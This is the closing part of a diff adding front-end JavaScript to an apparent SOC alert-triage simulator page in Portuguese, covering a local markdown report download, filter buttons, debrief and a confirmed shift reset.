+  const b=new Blob([buildReport()],{type:'text/markdown'});const u=URL.createObjectURL(b);
+  const l=h('a',{href:u,download:'relatorio-soc.md'});document.body.append(l);l.click();l.remove();setTimeout(()=>URL.revokeObjectURL(u),1000);
+}
+
+/* ===== Eventos ===== */
+document.querySelectorAll('.filters button').forEach(b=>b.addEventListener('click',()=>{S.filter=b.dataset.f;
+  document.querySelectorAll('.filters button').forEach(x=>{x.classList.toggle('on',x===b);x.classList.toggle('sec',x!==b);});renderList();}));
+$('#bDeb').addEventListener('click',openDebrief);
+$('#bRep').addEventListener('click',downloadReport);
+$('#bRst').addEventListener('click',()=>{if(confirm('Reiniciar o turno? Todas as triagens serão apagadas.')){S.sel=null;S.st={};S.enr=new Set();renderList();renderDetail();}});
+renderList();renderDetail();
+</script>
+</body>
+</html>
